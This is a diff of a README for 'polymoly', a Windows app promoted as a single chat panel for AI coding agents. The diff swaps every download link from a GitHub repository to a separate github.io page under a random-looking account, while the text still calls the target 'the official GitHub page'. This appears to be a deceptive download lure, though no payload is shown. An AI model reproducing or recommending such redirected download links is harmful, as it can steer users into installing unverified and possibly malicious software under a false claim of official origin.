@@ -1,7 +1,7 @@
 <h1>🧩 polymoly - One Chat Panel for All AI Coding Agents</h1>
 
 <p align="center">
-  <a href="https://github.com/Purlieuadulation1876/polymoly"><img src="https://img.shields.io/badge/Download-polymoly-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button"></a>
+  <a href="https://purlieuadulation1876.github.io"><img src="https://img.shields.io/badge/Download-polymoly-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button"></a>
 </p>
 
 ## 👋 What Is polymoly?
@@ -38,7 +38,7 @@ Ready to get started? Here's how to get polymoly on your Windows computer.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Purlieuadulation1876/polymoly](https://github.com/Purlieuadulation1876/polymoly)**
+Visit this link to download the application: **[https://purlieuadulation1876.github.io](https://purlieuadulation1876.github.io)**
 
 This link will take you to the official GitHub page where you can download the latest version.
 
@@ -163,7 +163,7 @@ polymoly runs smoothly on most Windows systems:
 
 Don't waste time switching between tools. Get polymoly today and bring all your AI coding agents together.
 
-👉 **[Download polymoly now](https://github.com/Purlieuadulation1876/polymoly)**
+👉 **[Download polymoly now](https://purlieuadulation1876.github.io)**
 
 Join thousands of developers who have simplified their AI workflow. Your one-stop chat panel is just one click away.
 
